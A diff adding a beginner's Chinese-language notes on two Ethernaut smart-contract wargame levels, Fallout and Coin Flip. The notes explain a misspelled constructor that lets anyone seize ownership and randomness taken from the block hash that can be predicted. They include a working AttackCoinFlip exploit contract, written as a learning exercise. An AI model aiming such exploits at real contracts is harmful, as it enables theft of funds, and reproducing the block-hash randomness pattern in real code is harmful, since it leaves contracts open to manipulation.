@@ -15,6 +15,184 @@ web3萌新
 ## Notes
 
 <!-- Content_START -->
+# 2025-08-18
+
+## 2.**fallout**
+
+复制代码到remix中遇到第一个报错：
+
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+这一行代码应该已经报错找不到路径了，需要替换早期版本如下
+
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+contract Fallout {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) allocations;
+    address payable public owner;
+
+    /* constructor */
+    function Fal1out() public payable {
+        owner = msg.sender;
+        allocations[owner] = msg.value;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "caller is not the owner");
+        _;
+    }
+
+    function allocate() public payable {
+        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
+    }
+
+    function sendAllocation(address payable allocator) public {
+        require(allocations[allocator] > 0);
+        allocator.transfer(allocations[allocator]);
+    }
+
+    function collectAllocations() public onlyOwner {
+        msg.sender.transfer(address(this).balance);
+    }
+
+    function allocatorBalance(address allocator) public view returns (uint256) {
+        return allocations[allocator];
+    }
+}
+```
+
+在网页上没有看出来，实际上构造函数的函数名字跟合约名字不一样Fal1out()和Fallout
+
+代码审计一下，只需调用一次Fal1out()即可获得合约所有权
+
+```solidity
+    /* constructor */
+    function Fal1out() public payable {
+        owner = msg.sender;
+        allocations[owner] = msg.value;
+    }
+```
+
+## 3.**Coin Flip**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+    uint256 public consecutiveWins;
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor() {
+        consecutiveWins = 0;
+    }
+
+    function flip(bool _guess) public returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+
+        if (lastHash == blockValue) {
+            revert();
+        }
+
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        if (side == _guess) {
+            consecutiveWins++;
+            return true;
+        } else {
+            consecutiveWins = 0;
+            return false;
+        }
+    }
+}
+```
+
+代码审计一下其实就是猜数字，需要连续猜对10次。
+
+数字的计算如下：
+
+```solidity
+uint256 blockValue = uint256(blockhash(block.number - 1));
+uint256 coinFlip = blockValue / FACTOR;
+bool side = coinFlip == 1 ? true : false;
+```
+
+取上一个区块的哈希值 blockhash(block.number - 1)；
+
+除以 FACTOR这里是57896044618658097711785492504343953926634992332820282019728792003956564819968
+
+得到的结果要么是 0，要么是 1；
+
+如果是 1，则答案是 true，否则是 false。
+
+这里我们能对其进行预测的原因是：
+
+在攻击合约 `attack()` 中
+
+```solidity
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = (coinFlip == 1);
+
+    // 底层调用目标合约的 flip(bool) 函数
+    (bool success, bytes memory data) = target.call(
+        abi.encodeWithSignature("flip(bool)", side)
+    );
+```
+
+这段逻辑与目标合约一模一样，而且发生在同一交易、同一 EVM 上下文中；
+
+所以绝无“算错/不同步”的可能（除非在同块内第二次调用，触发 `lastHash` 检查）。
+
+每个新区块都能得到确定的 side，于是可以连续 10 次全中（10 个区块，10 次交易）
+
+攻击脚本如下：
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract AttackCoinFlip {
+    address public target;
+    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _target) {
+        target = _target;
+    }
+
+    function attack() external {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = (coinFlip == 1);
+
+        (bool success, bytes memory data) = target.call(
+            abi.encodeWithSignature("flip(bool)", side)
+        );
+    }
+}
+```
+
+但是需要注意
+
+```solidity
+    if (lastHash == blockValue) {
+        revert();
+    }
+```
+
+如果两次猜测所在的区块一致会导致revert，因此脚本可能失败需要多执行几次。
+
 # 2025-08-17
 
 # 实践：Ethernaut闯关
